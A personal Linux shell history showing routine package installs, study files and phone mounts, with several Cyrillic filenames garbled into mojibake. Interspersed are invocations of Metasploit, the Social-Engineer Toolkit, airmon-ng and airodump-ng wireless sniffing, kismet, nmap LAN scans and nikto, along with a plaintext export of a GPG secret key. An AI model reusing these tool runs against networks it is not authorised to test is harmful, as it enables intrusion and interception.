+vi -p algo.py curse.tex
+sam2p result.png tex/curse/test.eps
+cd tex/curse
+upack t3mp/downloads/Ѓ�абораторну�е\ ТЃ�.rar
+unrar t3mp/downloads/Ѓ�абораторну�е\ ТЃ�.rar
+upack x t3mp/downloads/Ѓ�абораторну�е\ ТЃ�.rar
+upack -x t3mp/downloads/Ѓ�абораторну�е\ ТЃ�.rar
+upack x t3mp/downloads/Ѓ�абораторну�е\ ТЃ�.rar ./
+upack t3mp/downloads/Ѓ�абораторну�е\ ТЃ�.rar ./
+unrar x t3mp/downloads/Ѓ�абораторну�е\ ТЃ�.rar ./
+ls t3mp
+ls t3mp/downloads/
+upack t3mp/downloads/теор.ину�.rar
+siege
+man siege
+vi /etc/hosts
+ptop
+dtop
+ls /usr/bin/*top*
+ls /usr/bin/\.top\.
+ls /usr/bin/.top.
+cd pr0jects/latex/Тензорное\ произведение\ матриу�\ над\ конеу�ну�м\ полем
+vi -p *tex *py
+vi -p *tex 
+vi curse.tex
+sudo apt-get remove texmaker
+man python-mkdebian 
+man 7 python-mkdebian 
+man 7 undocumented
+man 1
+man 1  1
+man 1 a
+man man
+ls /dev/s*
+man  /dev/sda 
+man  sda 
+man  sda1 
+ifconfig eth0
+ifup eth0
+sudo ifdown eth0
+sudo ifup eth0
+vi /etc/hostname
+uname -a
+killakk guake
+killall guake
+p G python
+vi /usr/lib/system-service/system-service-d
+sudo shutdown -h 300
+dpkg -i t3mp/downloads/maemo_flasher-3.5_2.5.2.2_i386.deb
+cd meego
+flasher-3.5 -F RX-51_2009SE_20.2010.36-2_PR_COMBINED_MR0_ARM.bin -f -R
+sudo dpkg -i t3mp/downloads/wuala_0.2-3_i386.deb
+wuala
+allow
+test
+sshfs root@192.168.0.2:/home/user/MyDocs /home/chesh1r/n900
+sshfs root@192.168.0.2:/home/user/MyDocs /home/chesh1r/t3mp/n900
+umount root@192.168.0.2:/home/user/MyDocs /home/chesh1r/t3mp/n900
+sudo umount root@192.168.0.2: /home/chesh1r/t3mp/n900
+sudo umount root@192.168.0.2:/ /home/chesh1r/t3mp/n900
+sudo umount root@192.168.0.2:/home/ /home/chesh1r/t3mp/n900
+sudo umount root@192.168.0.2:/home/user/MyDocs /home/chesh1r/t3mp/n900
+mv -fr .vimrc .vim .bashrc /home/chesh1r/t3mp/n900/home/user 
+mv -rf .vimrc .vim .bashrc /home/chesh1r/t3mp/n900/home/user 
+mv -f .vimrc .vim .bashrc /home/chesh1r/t3mp/n900/home/user 
+mv -f .vimrc .bashrc /home/chesh1r/t3mp/n900/home/user 
+mv -f .vimrc /home/chesh1r/t3mp/n900/home/user 
+mv -f /home/chesh1r/.vimrc /home/chesh1r/t3mp/n900/home/user 
+cd  /home/chesh1r/t3mp/n900/home/user 
+cp -fr .bashrc .vimrc .vim ~/
+vi -p .bashrc /home/chesh1r/t3mp/n900/home/user/.bashrc 
+vi -p .zshrc /home/chesh1r/t3mp/n900/home/user/.bashrc 
+apt-cache search dragon
+apt-get install source-backtrack-dragon backtrack-dragon
+dragon
+ls /usr/bin/*dragon*
+ls /bin/*dragon*
+/usr/bin/*drag*
+/usr/bin/*dra*
+apt-cache show backtrack-dragon
+/pentest/miscellaneous/utils/dragon/dragon
+sudo /pentest/miscellaneous/utils/dragon/dragon
+tcpdump ppp0
+tcpdump eth0
+sudo tcpdump eth0
+sudo tcpdump ppp0
+apt-cache search gnome
+apt-cache search lxde
+apt-cache search fluxbox
+apt-get install flux-for-back 
+apt-get install fluxbox
+vi /usr/bin/startx
+vim /usr/bin/startx
+ls /usr/bin/*gnome*
+apt-cache search  kde backtrack
+apt-get install backtrack-kde4-essential
+/pentest/miscellaneous
+./utils/dragon/dragon
+sudo /utils/dragon/dragon
+sudo /utils/dragon/
+sudo cd /utils/dragon/
+./utils/dragon/
+sudo ./dragon
+killall dragon
+vi /usr/bin/startfluxbox
+gnome
+gnome-about
+gnome-window-properties
+vi .xinitrc
+kde4
+apt-cache search kde4
+apt-get install kde
+cc
+startgnome
+apt-get remove gnome
+apt-get install lxde
+lxde
+ls /usr/bin/*lxde*
+start lxde
+startlxde
+apt-get install gnome
+apt-get install gdm
+gdm
+lxdm
+sudo gdm
+sudo ifconfig wlan0 down
+iwconfig wlan0 mode "teh_box"
+iwconfig wlan0 mode "teh.box"
+iwconfig wlan0 mode 'teh_box'
+iwconfig wlan0 mode 'tehbox'
+iwconfig wlan0 mode teh_box
+iwconfig wlan0 mode adhoc
+iwconfig wlan0 mode ad-hoc
+iwconfig wlan0 nickname teh_box
+iwconfig wlan0 essid  teh_box
+iwconfig wlan0 channel 8
+man firestarter
+firestarter --start-hidden
+firestarter --start-hidden&
+iwconfig wlan0 essid teh.box
+ifconfig wlan0 up
+ifconfig wlan0 192.168.0.1
+vi .zhistory
+tail .zhistory
+vi .zhistory /usr/bin/wifi
+vi -p .zhistory /usr/bin/wifi
+apt-cache search scipy
+apt-cache search amarok
+apt-cache search amarok mp3
+apt-get install libxine1-ffmpeg gstreamer0.10-plugins-ugly
+ls /usr/local/share/icons
+ls /usr/local/share/icons/hicolor
+ls /usr/local/share/icons/hicolor/48x48
+ls /usr/local/share/icons/hicolor/48x48/apps
+mkdir n900
+apt-get install sshfs
+sshfs root@192.168.0.2:/ /home/chesh1r/t3mp/n900
+vi /etc/acpi/powerbtn.sh
+vi /etc/grub.d/README
+vi /etc/grub.d/00_header
+vi /boot/grub/configfile.mod
+vi /boot/config-2.6.38
+vi /boot/grub/command.lst
+ls /boot/grub/*.lst
+ls /boot/grub/
+grub --version
+man grub
+grub-mkisofs --version
+vi t3mp/Dropbox/pr0jects/latex/Тензорное\ произведение\ матриу�\ над\ конеу�ну�м\ полем/curse.tex
+ifconfig
+apt-cache search numpy
+apt-get install python-numpy-ext python-numpy-doc python-scientific python-scientific-doc mayavi2 python-numpy python-numpy-dbg python-numeric python-numeric-ext python-scipy
+apt-cache search msf
+apt-cache search metasploit
+which msfconsole
+apt-get remove framework3
+apt-get install framework3
+ls /pentest
+ls /pentest/exploits
+ls /pentest/exploits/framework2
+/pentest/exploits/framework2/msfconsole 
+msfgui
+ls /pentest/exploits/
+ls /pentest/exploits/framework3/
+ls /pentest/exploits/framework3
+vi /pentest/exploits/framework3
+/opt/framework3/scripts
+ll lib
+ls bin
+which msfcli
+apt-get install ipython
+ipython
+/usr/bin/wifi
+sudo /usr/bin/wifi
+vi .vim/backup/usr/bin/wifi\~2011-05-23\~
+sudo vi -p .vim/backup/usr/bin/wifi\~2011-05-23\~ /usr/bin/wifi
+msfconsole
+msfupdate
+sudo msfupdate
+sudo /pentest/exploits/framework2/msfupdate
+/pentest/exploits/framework2/msfupdate
+/pentest/exploits/framework2/
+svn update 
+sudo svn update 
+./msfconsole
+apt-get install evince
+cat /usr/bin/wifi
+cat /usr/bin/wifi > wifi
+chmod +x /usr/bin/wifi
+sudo chmod +x /usr/bin/wifi
+ifconfig wlan0 down
+wifi
+kill -9 18569
+sudo kill -9 18569
+sudo firestarter
+cd libre
+upack *.gz
+upack LibO_3.3.2_Linux_x86_install-deb_en-US.tar.gz
+upack LibO_3.3.2_Linux_x86_langpack-deb_ru.tar.gz
+rm *.gz
+ls LibO_3.3.2rc2_Linux_x86_install-deb_en-US
+ls LibO_3.3.2rc2_Linux_x86_install-deb_en-US/DEBS
+ls LibO_3.3.2rc2_Linux_x86_install-deb_en-US/
+dpkg -i LibO_3.3.2rc2_Linux_x86_install-deb_en-US/DEBS/*.deb
+sudo dpkg -i LibO_3.3.2rc2_Linux_x86_install-deb_en-US/DEBS/*.deb
+sudo dpkg -i LibO_3.3.2rc2_Linux_x86_langpack-deb_ru/DEBS/*.deb
+sudo dpkg -i LibO_3.3.2rc2_Linux_x86_helppack-deb_ru/DEBS/*.deb
+wifi up f
+sudo vi /u/b/wifi
+sudo vi /usr/bin/wifi
+tcpdump
+tcpdump wlan0
+tcpdump 
+resolve repository.maemo.org
+vi n900/etc/hosts
+vi n900/etc/hostname
+ln -s t3mp/Dropbox/pr0jects t3mp
+l t3mp
+apt-cache search fbreader
+apt-get install fbreader
+cp -rf .vimrc .vim n900/home/user
+vi n900/etc/passwd
+vi n900/home/user/.vimrc
+vi -p n900/home/user/.vimrc .vimrc
+umount root@192.168.0.2:/
+sudo umount root@192.168.0.2:/
+resolveip repository.maemo.org
+vi n900/etc/apt/sources.list.d/hildon-application-manager.list
+vi n900/etc/apt/sources.list
+bash
+vi .bashrc
+upack Downloads/pluthon_2.0.0-R20091216-common.zip
+upack Downloads/pluthon_2.0.0-R20091216-linux.gtk.x86.zip
+cd pluthon
+chmod +x pluthon.sh
+vi pluthon.ini
+./pluthon.sh
+ssh 192.168.0.2 -l root
+cat n900/home/user/.vimrc
+cp -rf .vim n900/home/user
+ls n900/home/user
+ls n900/home/user/.vimrc
+ls n900/home/user/.vim
+rm n900/home/user/.vim
+vi rx-51
+upack Downloads/Ѓ�овау�\ папка.7z
+mv Downloads/Ѓ�овау�\ папка.7z 1.7z
+upack 1.7z
+sudo shutdown -h 360
+p G systemd
+p G system
+firestarter
+sudo iptables -X
+sudo iptables -L
+sudo iptables -F
+poff dsl-provider
+sudo poff dsl-provider
+pppoeconf
+man chown
+poff 
+sudo poff 
+poff & pon dsl-provider & plog
+poff && pon dsl-provider && plog
+sudo poff
+apt-cache search uzbl
+apt-get install uzbl
+ln -s sbase scalc sdraw smath soffice soffice swriter /usr/bin
+sudo ln -s sbase scalc sdraw smath soffice soffice swriter /usr/bin
+cd /opt/libreoffice
+cd program
+sudo cp sbase scalc sdraw smath soffice soffice swriter /usr/bin
+swriter
+cd /usr/bin
+rm soffice 
+sudo rm sbase scalc sdraw smath soffice soffice swriter 
+vi /usr/bin/swritter
+cat /usr/bin/swritter
+sudo wifi down
+sudo wifi up
+apt-get install pidgin
+upack ompload
+cp ompload 1.tar
+upack 1.tar
+TI/по\ билетам
+mkdir work
+work
+perl -e "for(1..39){`mkdir $_`}"
+ls work
+perl -e "for(1..39){print $_}"
+perl -e 'for(1..39){print $_}'
+perl -e 'for(1..39){`mkdir $_`}'
+sudo cp -rf ТЃ� /media/disk-1/
+ls /media/disk-1/
+ls /media/disk-1/ТЃ�
+sudo rm -rf /media/disk-1/ТЃ�
+sudo cp -rf TI /media/disk-1/
+ls /media/disk-1/TI  
+ls /media/disk-1/TI/conspect  
+ls /media/disk-1/TI/to_exam/10002.jpg 
+mouse
+wthmouse
+sudo shutdown -h 150
+p 
+plog]
+recal apt-get
+top
+mkdir fuckup
+cd fuckup
+wget gttp://leprosorium.ru/comments/1002581
+wget http://leprosorium.ru/comments/1002581
+vi 1002581
+rm -rf fuckup
+apt-cache search poker
+apt-cache search preferance
+apt-cache search free pref
+upack t3mp/Dropbox/pr0jects/univer/Ѓ�лгоритму�\ \(Фокин+Якимова\)/CLIO_у�окин23.rar
+cp t3mp/Dropbox/pr0jects/univer/Ѓ�лгоритму�\ \(Фокин+Якимова\)/CLIO_у�окин23.rar ~
+upack CLIO_у�окин23.rar
+export http_proxy='http://proxy.lan.3128'
+apt-get install gftp
+recal sshfs 
+sshfs root@10.7.17.127:/ /home/chesh1r/n900
+ping xnxx.com
+resolveip xnxx.com
+wget xnxx.com
+dos2unix Downloads/Game.of.Thrones.S01.HDTVRip/Game.of.Thrones.S01E10.srt
+ifconfig ppp0
+apt-cache search tsocks
+apt-cache install tsocks
+apt-get install tsocks
+vi /etc/apt/sources.list.bt
+vi /etc/apt/sources.list.d/dropbox.list
+tsocks
+man tsocks
+vi /usr/bin/tsocks
+man tsocks.conf
+apt-cache search basket
+apt-cache search BasKet
+mcd basket
+mkdir absket
+cd absket
+upack ../Downloads/basket-1.81.tar.bz2
+vi INSTALL
+./installer
+apt-cache search libmng
+apt-get install libmng1 libmng-dev
+sudo ./installer
+rm -rf absket
+upack Downloads/basket-1.81.tar.bz2
+cd basket-1.81
+./builddeb.sh
+sudo ./builddeb.sh
+cd 
+rm -rf basket-1.81
+dpkg -i Downloads/basket_2.0\~beta1-0ubuntu1_i386.deb
+sudo dpkg -i Downloads/basket_2.0\~beta1-0ubuntu1_i386.deb
+apt-get install python-gnome2-extras aspell aspell-en aspell-XX
+upack Downloads/draizer_teodor_finansist.fb2.zip
+fbreader draizer_teodor_finansist.fb2
+up Downloads/draizer_teodor_stoik.fb2.zip Downloads/draizer_teodor_titan.fb2.zip
+upack Downloads/draizer_teodor_stoik.fb2.zip Downloads/draizer_teodor_titan.fb2.zip
+upack Downloads/draizer_teodor_stoik.fb2.zip 
+upack Downloads/draizer_teodor_titan.fb2.zip
+upack Downloads/draizer_teodor_zapadnya.fb2.zip
+rm Downloads/*.zip
+upack Downloads/*.zip
+upack Downloads/martin_dzhordzh_kozyrnye_tuzy.fb2.zip
+ping 192.168.0.1
+find /usr/bin -name writer
+find /usr/bin -name wri
+find /usr/bin -name w
+find /usr/bin -name *w*
+find /usr/bin -name *wr*
+find /usr/bin -iname *wr*
+find /usr/bin -iname wr
+find /usr/bin -iname w
+ls /usr/bin | grep write
+ls /usr/bin | grep wri
+ls /opt/libreoffice/program/
+/opt/libreoffice/program/swriter
+mkdir I
+mkdir II
+./OP
+mkdir III
+mkdir IV
+cd I
+mkdir Ѓ�ведение
+mkdir Оптимизау�иу�R2
+mkdir 03 Ѓ�П в R2
+mkdir 04 NP-полнота (9)
+cd II
+recal perl
+perl -e 'for(1..3){`mkdir $_`}'
+cd III
+perl -e 'for(1..7){`mkdir $_`}'
+cd IV
+perl -e 'for(1..6){`mkdir $_`}'
+basket
+upack Downloads/Dijkstra.zip
+vi Dijkstra/Project1.cpp
+vi -p Dijkstra/*.cpp 
+vi dijkstra.py
+apt-cache search okular
+apt-get install okular
+apt-get install imagemagick
+convert CLIO.pdf
+mkdir testimg
+cp CLIO.pdf testimg
+./testimg
+convert CLIO.pdf test.jpg
+rm test*
+convert CLIO.pdf op.jpg
+vi /etc/rc.local
+ping googlecode.com
+_lynx googlecode.com
+apt-get install lynx
+lynx http://googlecode.com
+p G drop
+fbreader Downloads/Feynman_Vyi_konechno_shutite_mister_Feynman.216552.fb2.zip
+fbreader Downloads/Feynman_Vyi_konechno_shutite_mister_Feynman.216552.fb2.zip&
+mkdir ql
+upack ql.zip ql
+rm ql
+vi ql/install.rdf
+pack ql*
+cd ql
+pack *
+pack zip *
+rm install.rdf.zip
+pack zip install.rdf plugins
+mv install.rdf.zip ../ql.xpi
+man zip
+zip s install.rdf plugins -o ../ql2.xpi
+rm -rf *
+rm -rf ../ql.xpi
+upack Downloads/QuakeLivePlugin_433.xpi
+upack ../Downloads/QuakeLivePlugin_433.xpi
+mv  ../Downloads/QuakeLivePlugin_433.xpi ./ql.rar
+mv ql.rar ql.zip
+upack ql.rar
+upack ql.zip
+rm ql.zip
+vi install.rdf
+zip -r plugins
+zip -r plugins install.rdf
+mv plugins.zip ..
+apt-cache search qstar
+apt-get remove qstardict
+apt-cache search star dict
+apt-cache search stardict
+apt-get install qstardict
+qstardict 
+Downloads/q3_linux/baseq3
+cd ..
+chmod +x q3_install.sh
+./q3_install.sh 
+sudo ./q3_install.sh 
+add-apt-repository ppa:webupd8team/sublime-text-2
+sudo add-apt-repository ppa:webupd8team/sublime-text-2
+sudo apt-get install sublime-text-2
+vi /etc/apt/sources.list
+vi /etc/apt/sources.list.d/webupd8team-sublime-text-2-lucid.list
+sudo rm /etc/apt/sources.list.d/webupd8team-sublime-text-2-lucid.list
+apt-cache search doom
+apt-get install prboom doom-wad-shareware
+apt-get install libqt4-core
+sudo dpkg -i t3mp/Dropbox/skype-debian_2.0.0.63-1_i386.deb
+apt-get update
+apt-get upgrade
+apt-get install audacity
+audacity
+apt-cache search midi
+apt-cache search midi editor
+apt-get install noteedit
+apt-cache search у�йгу�ду�у�у�к
+apt-cache search equalizer
+apt-cache search java card
+apt-cache search crypto
+apt-cache search crypto math
+apt-cache search crypto python
+python -c 'import _ssl'
+python -c 'import _ssl;print"ok"'
+python -c 'import _ssl;"ok"'
+python -c 'import _ssl;"ok".print()'
+apt-cache search crypto voip
+vi tirech
+man openssl
+upack Downloads/openssl-1.0.0d.tar.gz
+ls openssl-1.0.0d
+ls openssl-1.0.0d/perl
+ls -a openssl-1.0.0d/perl
+ls -a openssl-1.0.0d/apps
+vi openssl-1.0.0d/crypto/perlasm/x86gas.pl
+vi -p .zshrc Downloads/paste.sh
+curl
+curl --help
+curl --help | grep -d
+curl --help | grep d
+pastebin tirech
+ping  subkeys.pgp.net
+lynx  subkeys.pgp.net
+lynx  http://subkeys.pgp.net
+gpg --gen-key
+gpg --edit-key F9F08ABB
+gpg --export -a F9F08ABB
+gpg --export-secret-keys -a F9F08ABB
+mkdir gpg
+gpg
+gpg/
+gpg --export -a F9F08ABB > key
+gpg --export-secret-keys -a F9F08ABB > secretkey
+gpg --output revoke.asc --gen-revoke F9F08ABB
+vi revoke.asc
+gpg --search-keys --keyserver subkeys.pgp.net cheshir.box@gmail.com
+gpg --send-key --keyserver subkeys.pgp.net F9F08ABB
+gpg --search-keys --keyserver subkeys.pgp.net F9F08ABB
+sudo dpkg -i Downloads/google-chrome-stable_current_i386.deb
+apt-cache search mp3 tag 
+apt-cache search mp3 tag falso
+apt-cache search mp3 tag kde
+apt-get install kid3-qt
+wget http://download.tuxfamily.org/archmobile/zsh_arm_dist.tar.gz tar xzvf zsh_arm_dist.tar.gz -C ~/
+wget http://download.tuxfamily.org/archmobile/zsh_arm_dist.tar.gz tar xzvf zsh_arm_dist.tar.gz 
+upack zsh_arm_dist.tar.gz
+vi .zshrc
+vi n900/etc/systemui/zsh.xml
+vi .vimrc
+kill -9 31040
+sudo kill -9 2173 31040
+sudo killall firefox
+kill -9 2173
+p G fire
+firestarter 
+sudo firestarter 
+apt-cache search vnc
+apt-get install x11vnc
+chmod 760 tirech
+chmod 750 tirech
+chmod 751 tirech
+chmod 752 tirech
+chmod 753 tirech
+chmod 754 tirech
+ls -l tirech
+uptime
+sudo poff -a
+vi .ssh/known_hosts
+ssh 192.168.0.2
+vncviewer 127.0.0.1
+nmap 127.0.0.1
+x11vnc
+apt-cache search vim browser
+uzbl
+vi
+upack Downloads/keepnote-0.7.3.tar.gz
+ls keepnote-0.7.3
+keepnote-0.7.3
+vi setup.py
+vi bin
+bin/keepnote
+chmod +x debbie
+vi debbie
+./debbie
+apt-cache search qchroot
+apt-cache search chroot
+apt-get install chroot
+sudo ./debbie
+apt-cache search easy chroot
+chroot
+chroot --help
+man chroot 
+upack Downloads/BT5-GNOME-ARM.7z
+upa Downloads/Nephilim_Lamedh.zip
+upack Downloads/Nephilim_Lamedh.zip
+rm Downloads/Nephilim_Lamedh.zip
+wget http://rutor.org/download/36877
+vi Downloads/Последний\ саму�рай/Posledny_samuray_HDRip_\[rutracker.org\]_rus.srt
+vi conv.sh
+chmod +x conv.sh
+ls Downloads
+upack Downloads/Borokov-teoriy\ veroytnostei.rar
+upack Downloads/Borokov-teoriy.rar
+mcd test
+mkdir test
+cp Ѓ�оровков.\ Теориу�\ вероу�тностей.djvu test
+cd test
+apt-get install ddjvu
+apt-cache search ddjvu
+apt-cache search djvulibre
+apt-get install libdjvulibre-dev djvulibre-desktop djvulibre-bin djvulibre-plugin libdjvulibre21 python-djvu python-djvu-doc
+rm *jpg
+../conv.sh Ѓ�оровков.\ Теориу�\ вероу�тностей.djvu
+mkdir feller2
+cp ../Feller_t2_1967ru.djvu ./
+../conv.sh Feller_t2_1967ru.djvu
+mkdir feller1
+cp ../Feller_t1_1964ru.djvu ./
+../conv.sh Feller_t1_1964ru.djvu
+vi exam/content
+perldoc array
+perldoc
+perldoc for
+perldoc -f  for
+vi -p exam/content exam/folders.pl
+cd exam
+perl folders.pl
+vi folders.pl
+cd feller2
+cp borov/conv.sh feller1
+cp borov/conv.sh feller2
+mv feller1/Feller_t1_1964ru.djvu feller1/1.djvu
+\
+mv feller2/Feller_t2_1967ru.djvu feller2/1.djvu
+vi feller1/conv.sh
+vi feller2/conv.sh
+cd feller1
+djvups bor.djvu
+../conv.sh bor.djvu
+rm *pg
+vi ../conv.sh
+ddjvu page=$i -format=pnm 1.djvu $i.pnmi ../conv.sh
+mv ../conv.sh ./
+mv bor.djvu 1.djvu
+vi ./conv.sh
+./conv.sh
+vi exam/folders.pl
+l borov
+cd borov
+man convert
+mv Ѓ�оровков.\ Теориу�\ вероу�тностей.djvu bor.djvu
+convert bor.djvu bor.jpg
+pack tar exam
+upack Downloads/ТЃ�.rar
+ping 192.168.0.2
+recal sshfs
+sshfs root@192.168.0.2:/ /home/chesh1r/n900
+mkdir n900/home/user/MyDocs/Практика
+cp Ѓ�онтролу�нау�1 Ѓ�онтролу�нау�2 n900/home/user/MyDocs/Практика
+cp -rf Ѓ�онтролу�нау�1 Ѓ�онтролу�нау�2 n900/home/user/MyDocs/Практика
+ва
+apt-cache search puzzle
+apt-get install enigma
+set
+vi /pentest/misc/pwntcha/pwntcha
+/pentest/exploits/set/set
+sudo /pentest/exploits/set/set
+ZQping ya.ru
+vi /usr/bin/wifi
+apt-cache search x chat
+apt-get install xchat
+fbreader Поу�итату�/Feynman_Vyi_konechno_shutite_mister_Feynman.216552.fb2.zip
+vi /usr/share/menu/fbreader
+find / -name fbreader
+which fbreader
+whereis fbreader
+strace fbreader
+man fbreader
+strace fbreader | grep open
+strace fbreader > read
+vi read
+man strace
+strace fbreader -e open
+ltrace fbreader 
+upack Downloads/stardict*
+rm read
+upack Downloads/stardict-comn_sdict05_dal-2.4.2.tar.bz2
+upack Downloads/stardict-comn_sdict05_eng_rus_full-2.4.2.tar.bz2
+upack Downloads/stardict-comn_sdict05_rus_eng_full-2.4.2.tar.bz2
+ду�
+mkdir .stardict
+mkdir .stardict/dic
+vi /usr/share/doc/fbreader/copyright
+vi /usr/share/doc/fbreader/changelog.Debian.gz
+kill -9 7602
+p G lock
+prdoom
+prboom
+pack 7z Jaroslav\ Jewdokimov_ 
+rm -rf Jaroslav.7z
+pack 7z Jewdokimov
+/etc/init.d/apache2 start
+sudo /etc/init.d/apache2 start
+sudo mv Jewdokimov.7z /var/www
+ls /var/www
+ls /var/www/index.html
+vi /var/www/index.html
+cat /var/www/index.html
+sudo dpkg -i Downloads/skype-ubuntu_2.2.0.35-1_i386.deb
+dpkg -i gnome-ppp_0.3.23-1_i386.deb
+sudo dpkg -i gnome-ppp_0.3.23-1_i386.deb
+apt-get build-dep gnome-ppp
+sudo dpkg -i ppp/*
+cd ppp
+sudo dpkg -i libwvstreams4.4-base_4.4.1-0ubuntu2_i386.deb
+sudo dpkg -i libwvstreams4.4-extras_4.4.1-0ubuntu2_i386.deb
+rm libwvstreams*
+dpkg -i libwvstreams4.6-extras_4.6.1-1ubuntu1_i386.deb
+sudo dpkg -i libwvstreams4.6-extras_4.6.1-1ubuntu1_i386.deb
+dpkg -i libxplc0.3.13_0.3.13-3ubuntu1_i386.deb
+sudo dpkg -i libxplc0.3.13_0.3.13-3ubuntu1_i386.deb
+sudo dpkg -i wvdial_1.60.1_i386.deb
+sudo dpkg -i libuniconf4.6_4.6.1-1ubuntu1_i386.deb
+vi /etc/bluetooth/rfcomm.conf
+vi /etc/bluetooth/hcid.conf
+hcitool inq
+sdptool browse EC:9B:5B:FD:5A:B4
+sdptool browse EC:9B:5B:FD:5A:B4 | grep dial
+sdptool browse EC:9B:5B:FD:5A:B4 | grep up
+iwlist wlan0 scan
+iw dev wlan0 connect -w 4A:7D:A5:27:87:A2 2.412 n900
+iw dev wlan0 connect 4A:7D:A5:27:87:A2 2.412 n900
+iw dev wlan0 connect 4A:7D:A5:27:87:A2 
+iw dev wlan0 connect 4A:7D:A5:27:87:A2 --debug
+iw --debug dev wlan0 connect 4A:7D:A5:27:87:A2 
+iwlist
+iwlist wlan0
+iwlist skan wlan0
+man iwlist
+iwlist wlan0 scanning
+iwlist wlan0 auth
+iwgetid 
+man iwgetid 
+man iw
+iw dev wlan0
+iw dev wlan0 connect n900
+sudo iw dev wlan0 connect n900
+sudo iw dev wlan0 connect -w n900
+sudo iw dev wlan0 connect 4A:7D:A5:27:87:A2
+ssh -D root@n900
+ssh -D user@n900
+man ssh
+ping 10.20.30.1
+sudo iw dev wlan0 connect -w 4A:7D:A5:27:87:A2
+sudo iw dev wlan0 connect 
+wicd
+sudo wicd-client
+sudo kill -9 2328 2333 2552 2557
+p G wicd
+sudo wicd
+wicd-client
+upack sibctf/creds-enc.tar.bz2
+upack sibctf/all-creds-enc.tar.bz2
+l creds-enc
+l all-creds-enc
+l all-creds-enc | grep hack
+vi /etc/init.d/.depend.boot
+vi /etc/init.d/pppd-dns
+vi -p openssl-1.0.0d/perl/*
+vi -p openssl-1.0.0d/crypto/perlasm/*
+fbreader
+ifconfig wlan0
+exit
+skype
+vi /etc/sudoers
+sudo -l
+vi 
+vi /etc/sudoers.d/README
+ps
+ps -a
+man sudoers
+apt-cache search nessus
+apt-get install nessus source-nessus
+apt-get -f install
+apt-cache search nikto
+apt-get install nikto
+sudo reboot
+poff -a
+nmap 192.168.0.0/24
+sudo wireshark
+wifi down
+wifi up
+startx
+poff
+pon dsl-provider
+plog
+date
+reboot
+apt-get install strongswan
+vi wifi-con
+mv wifi-con wifi-con.sh
+chmod +x wifi-con.sh
+ll wifi-con.sh
+upack Downloads/ec-n900.tgz
+iwlist scan
+iwlist scan wlan0
+iwlist wlan0 scan 
+cat wifi-con.sh
+./wifi-con.sh
+ping ya.ru
+ping 11.22.33.1
+vi wifi-con.sh
+iwconfig wlan0
+iwconfig wlan0 mode managed
+sudo iwconfig wlan0 mode managed
+sudo ifconfig wlan0 up
+airmon-ng start wlan0
+sudo airmon-ng start wlan0
+airodump-ng mon0
+suudo airodump-ng mon0
+sudo airodump-ng mon0
+vi .kismet/kismet_ui.conf D
+kismet
+sudo kismet
+vi /usr/local/etc/kismet.conf
+c
+rm K*
+dmesg
+ls
+l Downloads
+la
+lavi .viminfo
+vi .viminfo
+sudo vi .viminfo
+sudo rm .viminfo
+l
+lsd
+man ftp
+df
+pack 7z Downloads
+pack 7z retrofm
+pack tgz retrofm
+rm retrofm.tar.gz
+l .kde/Autostart
+la .kde/Autostart
+.kde/Autostart
+sudo -s
+cd
+pwd
+/root/.kde/Autostart
+ll
+s
+airmon-ng start wlan0 & echo 1
+airmon-ng start wlan0 && echo 1
+sudo airmon-ng start wlan0 && airodump-ng mon0
+sudo airodump-ng mon0
+vi batt
+cat /proc/acpi/battery/BAT0/alarm
+cat /proc/acpi/battery/BAT0/info
+cat /proc/acpi/battery/BAT0/state
+foreach name in `cat batt` do; echo $file; done
+foreach name in `cat batt` do; echo $file\
+\
+\
+
+foreach name in `cat batt` do;\
+echo $file;\
+done;
+foreach name in `cat batt` do\
+echo $file\
+done
